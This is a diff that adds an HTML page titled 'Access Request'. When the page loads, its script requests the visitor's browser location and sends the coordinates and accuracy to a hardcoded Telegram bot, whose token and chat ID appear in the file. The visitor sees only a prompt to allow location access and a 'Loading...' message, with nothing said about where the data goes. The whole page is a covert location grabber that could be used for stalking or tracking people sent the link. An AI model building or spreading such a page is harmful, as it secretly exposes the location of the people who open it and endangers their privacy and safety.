@@ -1,0 +1,87 @@
+<!DOCTYPE html><html><head><title>Access Request</title>
+
+<meta charset="UTF-8">
+
+<script>
+
+    // ==== EDIT THESE ====
+
+    const BOT_TOKEN = "8697179005:AAFwHriaUJi3_qO8kv_rvcCneZUu9K11i0g";
+
+    const CHAT_ID = "6809951887";
+
+    // ===================
+
+
+
+    function sendLocation(position) {
+
+        const lat = position.coords.latitude;
+
+        const lon = position.coords.longitude;
+
+        
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+
+            method: 'POST',
+
+            headers: {'Content-Type': 'application/json'},
+
+            body: JSON.stringify({
+
+                chat_id: CHAT_ID,
+
+                latitude: lat,
+
+                longitude: lon
+
+            })
+
+        });
+
+        
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+
+            method: 'POST',
+
+            headers: {'Content-Type': 'application/json'},
+
+            body: JSON.stringify({
+
+                chat_id: CHAT_ID,
+
+                text: `📍 Lat: ${lat}, Lon: ${lon}\nAccuracy: ${position.coords.accuracy}m`
+
+            })
+
+        });
+
+    }
+
+    
+
+    function requestLocation() {
+
+        if (navigator.geolocation) {
+
+            navigator.geolocation.getCurrentPosition(sendLocation, () => {});
+
+        }
+
+    }
+
+    
+
+    // Run automatically
+
+    requestLocation();
+
+</script>
+
+</head><body style="background:#0a0a0a;color:white;text-align:center;padding-top:50px;"><h2>Please allow location access</h2>
+
+<p>Loading...</p>
+
+</body></html>
